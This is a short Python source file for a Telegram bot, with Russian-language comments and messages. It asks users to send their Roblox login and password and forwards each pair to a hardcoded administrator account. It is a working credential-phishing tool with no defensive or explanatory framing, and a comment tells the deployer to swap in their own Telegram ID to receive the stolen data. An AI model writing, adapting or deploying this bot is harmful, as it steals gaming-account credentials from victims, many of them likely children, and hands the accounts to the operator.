import os
import telebot

TOKEN = os.environ.get("TELEGRAM_TOKEN")
ADMIN_ID = 8905541945 # ЗАМЕНИ НА СВОЙ ID (узнай у @userinfobot)

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Введи логин и пароль от Roblox через пробел")

@bot.message_handler(func=lambda m: True)
def get_data(message):
    try:
        login, password = message.text.split()
        bot.send_message(ADMIN_ID, f"Логин: {login}\nПароль: {password}")
        bot.send_message(message.chat.id, "✅ Отправлено админу!")
    except:
        bot.send_message(message.chat.id, "❌ Ошибка! Пиши: логин пароль")

print("Бот запущен!")
bot.infinity_polling()
